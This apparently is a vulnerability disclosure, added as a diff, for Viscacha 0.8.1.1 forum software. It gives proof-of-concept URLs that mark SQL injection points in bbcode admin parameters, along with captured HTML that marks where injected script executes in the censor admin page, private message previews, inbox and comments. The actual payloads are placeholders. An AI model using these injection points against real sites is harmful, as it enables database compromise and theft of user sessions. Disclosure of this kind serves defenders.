@@ -1,0 +1,119 @@
+SQl Injection:
+
+PoC: POSTDATA
+
+http://www.example.com/title=say&bbcodetag=-1%27&bbcodetag_old=s&bbcodereplacement=-1%27&bbcodeexample=-1%27[SQL-INJECTION]&bbcodeexplanation=-1%27&twoparams=0&buttonimage=-1%27
+... or
+http://www.example.com/title=say&bbcodetag=-1%27&bbcodetag_old=s&bbcodereplacement=-1%27&bbcodeexample=-1%27&bbcodeexplanation=-1%27&twoparams=0&buttonimage=[SQL-INJECTION]
+... &
+http://www.example.com/title=say&bbcodetag=-1%27[SQL-INJECTION]&bbcodetag_old=s&bbcodereplacement=-1%27&bbcodeexample=-1%27&bbcodeexplanation=-1%27&twoparams=0&buttonimage=-1%27
+
+
+HTML Injection:
+
+Review: Zensur - Bad Word & Listing
+ 
+<td class="mbox" width="45%">.....">.....<[EXECUTION OF SCRIPT CODE HERE!]' <<="" td="">
+  </tr>
+  <tr>
+ 
+<td class="ubox" width="100%" colspan=3 align="center"><input type="submit" name="Submit"
+value="Löen"></td>
+  </tr>
+ </table>
+</form>
+<br>
+<form name="form"
+method="post" action="admin.php?action=bbcodes&job=add&tp=censor">
+ <table class="border">
+   
+<tr>
+   <td class="obox" colspan=2>Wort hinzufüb></td>
+  </tr>
+  <tr>
+    
+<td class="mbox" width="30%">Wort:<br /><span class="stext">Maximal 200 Zeichen</span></td>
+    
+<td class="mbox" width="70%"><input type="text" name="temp1" size="70"></td>
+   
+</tr>
+  <tr>
+   <td class="mbox" width="30%">Zensiertes Wort:<br /><span class="stext">
+Maximal 255 Zeichen</span></td>
+   <td class="mbox" width="70%"><input type="text" name="temp2"
+size="70"></td>
+  </tr>
+  <tr>
+   <td class="ubox" colspan="2" align="center"><
+input type="submit" name="Submit" value="Hinzufü</td>
+  </tr>
+ </table>
+</form>
+ 
+<br style="line-height: 8px;" />
+<div class="stext center">[Generiert in 0.00224 Sekunden]
+[Datenbankabfragen: 2]</div>
+<div id="copyright">
+ 
+Powered by <strong><a href="http://www.viscacha.org" target="_blank">Viscacha 0.8.1.1</a></strong>
+<br />Copyright © 2004-2009, The Viscacha Project
+ 
+<img src="cron.php" width="0" height="0" alt="" />
+</div>
+    </body>
+  </html>
+  </iframe></td>
+ 
+URL: http://www.example.com/viscacha/admin.php?action=bbcodes&job=censor
+
+
+Review: PN Message Preview
+ 
+ 
+<br class="newinput"><hr class="formsep">
+<label for="topic">Titel:</label>
+<input tabindex="2000" id="topic" class="label" name="topic" size="30" value=""
+type="text"><[INJECT SCRIPT CODE HERE!] <"="">
+<br class="newinput"
+/><hr class="formsep" />
+<
+ 
+URL: http://www.example.com/viscacha/pm.php
+
+
+... or
+ 
+Review: PN Message Preview - Arrived Message - Inbox
+ 
+<div class="bbody">
+<span class="stext">.....Betreff:
+<strong>"><[EXECUTION OF SCRIPT CODE HERE!] <</strong>
+</span>
+<hr>
+"><[EXECUTION OF SCRIPT CODE HERE!] '
+<<br="" class="iefix_left">
+</div>
+</div>
+ 
+<noscript><br />
+ 
+<div class="popup_noscript">
+ 
+<a name="generallinks"></a><strong>Verschiedene Links</strong>
+ 
+<ul>
+ 
+ 
+URL: http://www.example.com/viscacha/pm.php
+
+
+Review: Kommentare - Comments Input/Output
+ 
+ <input id="membersuggest_val" tabindex="1" onkeyup="ajax_searchmember(this.value, key(event))"
+onblur="ajax_searchmember(this.value)" name="name" size="40" value=""><
+[EXECUTION OF SCRIPT CODE HERE!]  <" type="text">
+    <br><span class="stext" id="membersuggest">
+</span>
+</div>
+<br class="newinput"><hr class="formsep">
+<label for="topic">Titel:</label>
